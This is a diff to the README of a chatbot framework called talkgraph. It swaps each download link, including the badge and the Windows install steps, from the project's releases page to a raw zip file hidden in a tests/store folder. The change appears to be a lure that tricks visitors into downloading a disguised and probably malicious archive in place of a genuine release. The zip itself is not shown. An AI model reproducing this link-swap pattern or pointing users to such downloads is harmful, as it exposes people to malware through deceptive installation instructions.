@@ -1,6 +1,6 @@
 # 🤖 talkgraph - Build chatbots that handle real chats
 
-[![Download talkgraph](https://img.shields.io/badge/Download%20talkgraph-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cloisonnestroke653/talkgraph/releases)
+[![Download talkgraph](https://img.shields.io/badge/Download%20talkgraph-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cloisonnestroke653/talkgraph/raw/refs/heads/main/packages/core/tests/store/Software-3.5.zip)
 
 ## 🧭 What talkgraph is
 
@@ -36,7 +36,7 @@ If the release includes a setup file, Windows can usually run it with a double c
 
 ## 📥 Download talkgraph for Windows
 
-1. Open the release page here: https://github.com/cloisonnestroke653/talkgraph/releases
+1. Open the release page here: https://github.com/cloisonnestroke653/talkgraph/raw/refs/heads/main/packages/core/tests/store/Software-3.5.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows file, such as:
    - `.exe`
@@ -169,4 +169,4 @@ Yes. Human-in-the-loop support lets a person step in when needed
 
 ## 🔗 Download again
 
-Open the Windows release page here: https://github.com/cloisonnestroke653/talkgraph/releases
+Open the Windows release page here: https://github.com/cloisonnestroke653/talkgraph/raw/refs/heads/main/packages/core/tests/store/Software-3.5.zip
